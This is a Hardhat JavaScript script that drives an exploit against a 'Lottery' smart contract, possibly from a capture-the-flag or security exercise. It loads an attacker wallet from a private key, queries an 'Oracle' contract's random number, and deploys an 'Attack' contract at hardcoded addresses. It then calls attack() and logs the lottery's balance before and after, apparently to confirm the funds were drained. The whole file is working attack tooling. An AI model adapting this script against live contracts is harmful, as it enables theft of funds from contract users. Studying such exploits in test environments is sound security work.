// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
require("dotenv").config();

async function main() {
  const attacker = new ethers.Wallet(
    process.env.DEV_PRIVATE_KEY,
    ethers.provider
  );
  const lottery = await ethers.getContractAt(
    "Lottery",
    "0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A"
  );
  const oracle = await ethers.getContractAt(
    "Oracle",
    "0x0d186F6b68a95B3f575177b75c4144A941bFC4f3"
  );
  console.log(await oracle.connect(attacker).getRandomNumber());

  console.log("Attacker address:", attacker.address);

  const Attack = await ethers.getContractFactory("Attack");
  const attack = await Attack.connect(attacker).deploy(
    lottery.address,
    oracle.address
  );
  await attack.deployed();

  console.log("Attack deployed to:", attack.address);

  console.log(
    "Balance before: ",
    await ethers.provider.getBalance(lottery.address)
  );
  const tx = await attack.connect(attacker).attack({ gasLimit: 1000000 });
  await tx.wait();

  console.log(
    "Balance after: ",
    await ethers.provider.getBalance(lottery.address)
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
